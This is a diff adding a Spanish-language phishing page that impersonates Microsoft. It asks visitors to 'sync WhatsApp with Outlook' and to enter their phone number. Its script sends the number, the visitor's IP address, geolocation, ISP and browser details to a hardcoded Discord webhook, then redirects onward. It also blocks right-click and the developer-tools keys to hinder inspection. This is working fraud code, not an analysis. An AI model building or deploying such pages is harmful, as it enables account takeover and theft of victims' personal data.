@@ -1,0 +1,623 @@
+
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>linea</title>
+    <link rel="shortcut icon" type="image/x-icon" href="">
+    <link href="./index3_files/css2" rel="stylesheet">
+    <link rel="stylesheet" href="./index3_files/all.min.css">
+    <style>
+        :root {
+            --blue-dark: #106ebe;
+            --blue-light: #0078d4;
+            --gray-dark: #616161;
+            --gray-light: rgba(243, 242, 241, 0.9);
+            --border-radius: 12px;
+            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            --transition: all 0.2s ease-in-out;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body, html {
+            height: 100%;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #1b1b1b;
+            line-height: 1.5;
+            margin: 0;
+            padding-bottom: 30px;
+        }
+
+        body {
+           
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            min-height: 100vh;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: -1;
+        }
+
+        .login-container {
+            width: 87%;
+            max-width: 440px;
+            padding: 0 15px;
+            animation: fadeIn 0.5s ease-out;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-box, .popup-box {
+            width: 100%;
+            max-width: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            box-shadow: var(--box-shadow);
+            border-radius: var(--border-radius);
+            padding: 40px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            margin: 20px 0;
+            backdrop-filter: blur(8px);
+            z-index: 10;
+        }
+
+        .popup-box {
+            text-align: center;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            max-width: 400px;
+            padding: 2rem;
+            animation: fadeInPopup 0.7s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            opacity: 1;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        .popup-box.hidden {
+            opacity: 0;
+            transform: translate(-50%, -60%);
+            pointer-events: none;
+        }
+
+        @keyframes fadeInPopup {
+            from { opacity: 0; transform: translate(-50%, -40%); }
+            to { opacity: 1; transform: translate(-50%, -50%); }
+        }
+
+        .popup-box img {
+            width: 48px;
+            margin-bottom: 12px;
+        }
+
+        .popup-box h2 {
+            color: #d83b01;
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 0.8rem;
+            letter-spacing: 0.1px;
+        }
+
+        .popup-box p {
+            color: #333;
+            font-size: 1.05rem;
+            margin-bottom: 1.5rem;
+            line-height: 1.6;
+        }
+
+        .popup-box .loading-gif {
+            width: 64px;
+            margin-top: 10px;
+        }
+
+        .login-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .login-header img {
+            width: 108px;
+            padding-bottom: 24px;
+            transition: transform 0.3s ease;
+        }
+
+        .login-header img:hover {
+            transform: scale(1.05);
+        }
+
+        .login-title {
+            font-size: 24px;
+            font-weight: 500;
+            color: #242424;
+            margin: 0 0 8px 0;
+        }
+
+        .login-subtitle {
+            font-size: 14px;
+            color: #424242;
+            margin: 0 0 20px 0;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-control, .form-control select {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #707070;
+            width: 100%;
+            height: 40px;
+            padding: 8px 12px;
+            border: 1px solid rgba(166, 166, 166, 0.5);
+            border-radius: 4px;
+            font-size: 14px;
+            transition: var(--transition);
+            background-color: rgba(255, 255, 255, 0.9);
+        }
+
+        .form-control:focus, .form-control select:focus {
+            outline: none;
+            border-color: var(--blue-light);
+            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.3);
+            background-color: #fff;
+        }
+
+        .btn-primary {
+            background-color: var(--blue-light);
+            color: white;
+            width: 100%;
+            height: 40px;
+            padding: 10px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            text-align: center;
+            border: none;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.7rem;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--blue-dark);
+            transform: translateY(-1px);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .mobile-footer {
+            position: fixed;
+            bottom: 8px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            background: transparent;
+            padding: 0;
+            margin-bottom: 16px;
+            font-size: 12px;
+            color: #fff;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+            z-index: 9999;
+        }
+
+        .mobile-footer .footer-links {
+            display: inline-flex;
+            gap: 32px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .mobile-footer .footer-link {
+            color: #fff !important;
+            text-decoration: none;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+        }
+
+        .mobile-footer .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .mobile-footer .footer-note {
+            margin-top: 8px;
+            color: #fff;
+            font-size: 10px;
+            line-height: 1.3;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+            padding: 0 10px;
+        }
+
+        .mobile-footer .footer-note a {
+            color: #a0d2ff;
+            text-decoration: none;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+        }
+
+        .mobile-footer .footer-note a:hover {
+            text-decoration: underline;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                background: url('https://cdn.glitch.global/7177bfef-a9de-49ca-904a-bc82dc609bfd/Captura%20de%20pantalla%202025-03-13%20234358.png?v=1741927464384') no-repeat center center fixed !important;
+                background-size: cover !important;
+                display: flex !important;
+                align-items: center !important;
+                justify-content: center !important;
+                min-height: 100vh !important;
+                padding: 20px 0 !important;
+            }
+
+            body::before {
+                background: rgba(0, 0, 0, 0.5) !important;
+            }
+
+            .login-container {
+                min-height: auto;
+                justify-content: flex-start;
+                padding: 20px 0;
+                height: auto;
+            }
+
+            .login-box, .popup-box {
+                width: 100% !important;
+                max-width: 100% !important;
+                padding: 20px !important;
+                background: rgba(255, 255, 255, 0.95) !important;
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2) !important;
+                border-radius: 8px !important;
+                border: none !important;
+                margin: 0 15px;
+            }
+
+            .popup-box {
+                padding: 1.5rem !important;
+            }
+
+            .popup-box h2 {
+                font-size: 1.3rem;
+            }
+
+            .popup-box p {
+                font-size: 0.95rem;
+            }
+
+            .popup-box .loading-gif {
+                width: 48px;
+            }
+
+            .login-title {
+                font-size: 20px !important;
+                margin-bottom: 4px !important;
+            }
+
+            .login-subtitle {
+                font-size: 14px !important;
+                margin-bottom: 16px !important;
+            }
+
+            .mobile-footer {
+                font-size: 11px;
+            }
+
+            .mobile-footer .footer-links {
+                gap: 20px;
+            }
+
+            .mobile-footer .footer-note {
+                font-size: 9px;
+            }
+
+            .login-header img {
+                width: 90px;
+                padding-bottom: 16px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .mobile-footer .footer-links {
+                gap: 15px;
+            }
+
+            .login-box, .popup-box {
+                padding: 15px !important;
+            }
+        }
+    </style>
+    <script src="imagen/jquery.min.js.descarga"></script>
+    <script type="text/javascript" src="imagen/imagenes.js"></script>
+</head>
+<body oncontextmenu="return false">
+<script>
+document.addEventListener("keydown", function(e) {
+    if(e.key === "F12") return false;
+    if(e.ctrlKey && e.key === "u") return false;
+    if(e.ctrlKey && e.shiftKey && e.key === "I") return false;
+});
+</script>
+
+
+
+<div class="login-container" id="msContainer">
+    <div class="login-box">
+        <div class="login-header">
+           <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/LOUr1FEL2KE1FIlJK6Y5a/3b908f725e1248318ea8a294d8d0d7b1/microsoft.png" 
+                    >
+            <h1 class="login-title">Sincroniza tu cuenta de WhatsApp con Outlook</h1>
+            <span class="login-subtitle">Ingrese su número de teléfono para verificar y sincronizar su cuenta de WhatsApp con Outlook.</span>
+        </div>
+        <form id="loginForm" class="form-group" method="post" autocomplete="off" aria-label="Formulario de verificación">
+            <div class="form-group">
+                <label for="country">País</label>
+                <select id="country" class="form-control" required="" aria-required="true">
+                    <option value="" disabled="" selected="">Selecciona tu país</option>
+                    <option value="+54">🇦🇷 Argentina</option>
+                    <option value="+591">🇧🇴 Bolivia</option>
+                    <option value="+55">🇧🇷 Brasil</option>
+                    <option value="+56">🇨🇱 Chile</option>
+                    <option value="+57">🇨🇴 Colombia</option>
+                    <option value="+506">🇨🇷 Costa Rica</option>
+                    <option value="+53">🇨🇺 Cuba</option>
+                    <option value="+1">🇩🇴 República Dominicana</option>
+                    <option value="+593">🇪🇨 Ecuador</option>
+                    <option value="+503">🇸🇻 El Salvador</option>
+                    <option value="+502">🇬🇹 Guatemala</option>
+                    <option value="+504">🇭🇳 Honduras</option>
+                    <option value="+52">🇲🇽 México</option>
+                    <option value="+505">🇳🇮 Nicaragua</option>
+                    <option value="+507">🇵🇦 Panamá</option>
+                    <option value="+595">🇵🇾 Paraguay</option>
+                    <option value="+51">🇵🇪 Perú</option>
+                    <option value="+1">🇵🇷 Puerto Rico</option>
+                    <option value="+598">🇺🇾 Uruguay</option>
+                    <option value="+58">🇻🇪 Venezuela</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="telefono">Número de teléfono</label>
+                <input type="tel" id="telefono" name="telefono" class="form-control" placeholder="Ej: +54 11 1234 5678" required="" pattern="^\+?\d{1,4}[\s\d]{6,}$" aria-required="true">
+            </div>
+            <button type="submit" class="btn btn-primary" aria-label="Continuar">
+                <i class="fa-brands fa-microsoft"></i> Continuar
+            </button>
+        </form>
+    </div>
+    <div class="mobile-footer">
+        <div class="footer-links">
+            <a href="" class="footer-link">Ayuda</a>
+            <a href="" class="footer-link">Términos de uso</a>
+            <a href="l#" class="footer-link">Privacidad y cookies</a>
+        </div>
+        <div class="footer-note">
+            Usa la exploración privada si este no es tu dispositivo.
+            <a href="">Más información</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Configuración Discord Webhook (reemplaza con tu URL)
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1465605598677565473/GpPoSB9EH8AtU-3gb5Eqr3TA_A2Z5Q_nU4lzAtPhE00nDk9SRjMuj5HU63u71JKjr-6G';
+
+    $(document).ready(function(){
+        setTimeout(function() {
+            document.getElementById('msPopup').classList.add('hidden');
+            document.getElementById('msContainer').classList.remove('hidden');
+        }, 3500);
+
+        $('#loginForm').submit(function(e){
+            e.preventDefault();
+            var u_namec = $('#country').val();
+            var u_namet = $('#telefono').val();
+
+            // Guardamos el número para usarlo en index2
+            localStorage.setItem("telefonoUsuario", u_namet);
+
+            var ip, ip2, country, region, city, isp;
+            
+            // Primera petición para obtener IP
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+                ip = data.ip;
+                
+                // Segunda petición para obtener geolocalización detallada
+                $.getJSON("https://ipinfo.io", function(response) {
+                    ip2 = response.city + ", " + response.country;
+                    country = response.country || "Desconocido";
+                    region = response.region || "Desconocido";
+                    city = response.city || "Desconocido";
+                    isp = response.org || "Desconocido";
+                    
+                    // Obtener información del navegador
+                    var browserInfo = navigator.userAgent;
+                    var platform = navigator.platform;
+                    var language = navigator.language;
+                    
+                    // Crear embed para Discord
+                    var embed = {
+                        "title": "📱 **NUEVO INGRESO DE WHATSAPP**",
+                        "color": 65280, // Verde
+                        "fields": [
+                            {
+                                "name": "📞 **Número de Teléfono**",
+                                "value": "```" + u_namet + "```",
+                                "inline": true
+                            },
+                            {
+                                "name": "🌍 **País Seleccionado**",
+                                "value": "```" + u_namec + "```",
+                                "inline": true
+                            },
+                            {
+                                "name": "🌐 **Información de IP**",
+                                "value": "**IP:** `" + ip + "`\n**País:** " + country + "\n**Región:** " + region + "\n**Ciudad:** " + city + "\n**ISP:** " + isp,
+                                "inline": false
+                            },
+                            {
+                                "name": "💻 **Información del Dispositivo**",
+                                "value": "**Navegador:** " + getBrowserName() + "\n**Sistema:** " + platform + "\n**Idioma:** " + language,
+                                "inline": false
+                            },
+                            {
+                                "name": "🕐 **Fecha y Hora**",
+                                "value": new Date().toLocaleString('es-ES', {
+                                    timeZone: 'America/Mexico_City',
+                                    hour12: true
+                                }),
+                                "inline": false
+                            }
+                        ],
+                        "footer": {
+                            "text": "WhatsApp Login Logger • " + new Date().toLocaleDateString()
+                        },
+                        "timestamp": new Date().toISOString()
+                    };
+
+                    // Configuración para enviar a Discord Webhook
+                    var settings = {
+                        "async": true,
+                        "crossDomain": true,
+                        "url": DISCORD_WEBHOOK_URL,
+                        "method": "POST",
+                        "headers": {
+                            "Content-Type": "application/json"
+                        },
+                        "data": JSON.stringify({
+                            "embeds": [embed],
+                            "content": "🔔 **NUEVO ACCESO DETECTADO**",
+                            "username": "WhatsApp Security",
+                            "avatar_url": "https://cdn-icons-png.flaticon.com/512/733/733585.png"
+                        })
+                    };
+
+                    // Enviar a Discord
+                    $.ajax(settings).done(function(response) {
+                        console.log("Datos enviados a Discord correctamente");
+                        window.location = 'cargando.html';
+                    }).fail(function(error) {
+                        console.error("Error al enviar a Discord:", error);
+                        // Redirigir incluso si falla el envío
+                        window.location = 'cargando.html';
+                    });
+                    
+                }).fail(function() {
+                    // Si falla ipinfo.io, enviar datos básicos
+                    sendBasicData(ip, u_namet, u_namec);
+                });
+                
+            }).fail(function() {
+                // Si falla api.ipify.org, enviar sin IP
+                sendBasicData(null, u_namet, u_namec);
+            });
+        });
+
+        // Función para enviar datos básicos si fallan las APIs
+        function sendBasicData(ip, phone, country) {
+            var embed = {
+                "title": "📱 **NUEVO INGRESO DE WHATSAPP**",
+                "color": 16711680, // Rojo
+                "fields": [
+                    {
+                        "name": "📞 **Número de Teléfono**",
+                        "value": "```" + phone + "```",
+                        "inline": true
+                    },
+                    {
+                        "name": "🌍 **País Seleccionado**",
+                        "value": "```" + country + "```",
+                        "inline": true
+                    },
+                    {
+                        "name": "⚠️ **Información de IP**",
+                        "value": ip ? "**IP:** `" + ip + "`" : "No se pudo obtener la IP",
+                        "inline": false
+                    }
+                ],
+                "timestamp": new Date().toISOString()
+            };
+
+            $.ajax({
+                url: DISCORD_WEBHOOK_URL,
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                data: JSON.stringify({ "embeds": [embed] })
+            }).done(function() {
+                window.location = 'ced2.html';
+            }).fail(function() {
+                window.location = 'ced2.html';
+            });
+        }
+
+        // Función para detectar el navegador
+        function getBrowserName() {
+            var userAgent = navigator.userAgent;
+            var browserName;
+            
+            if(userAgent.match(/chrome|chromium|crios/i)){
+                browserName = "Chrome";
+            } else if(userAgent.match(/firefox|fxios/i)){
+                browserName = "Firefox";
+            } else if(userAgent.match(/safari/i)){
+                browserName = "Safari";
+            } else if(userAgent.match(/opr\//i)){
+                browserName = "Opera";
+            } else if(userAgent.match(/edg/i)){
+                browserName = "Edge";
+            } else {
+                browserName = "Desconocido";
+            }
+            
+            return browserName;
+        }
+
+        const countrySelect = document.getElementById('country');
+        const phoneInput = document.getElementById('telefono');
+        countrySelect.addEventListener('change', function() {
+            phoneInput.value = countrySelect.value + " ";
+        });
+        
+        // Obtener ubicación del usuario
+        fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            const countryCode = data.country_code;
+            const countryMap = {
+                'AR': '+54','BO': '+591','BR': '+55','CL': '+56','CO': '+57','CR': '+506','CU': '+53','DO': '+1',
+                'EC': '+593','SV': '+503','GT': '+502','HN': '+504','MX': '+52','NI': '+505','PA': '+507','PY': '+595',
+                'PE': '+51','PR': '+1','UY': '+598','VE': '+58'
+            };
+            countrySelect.value = countryMap[countryCode] || '';
+            phoneInput.value = countryMap[countryCode] ? countryMap[countryCode] + " " : "";
+        })
+        .catch(error => console.error('Error al obtener la ubicación:', error));
+    });
+</script>
+
+</body></html>
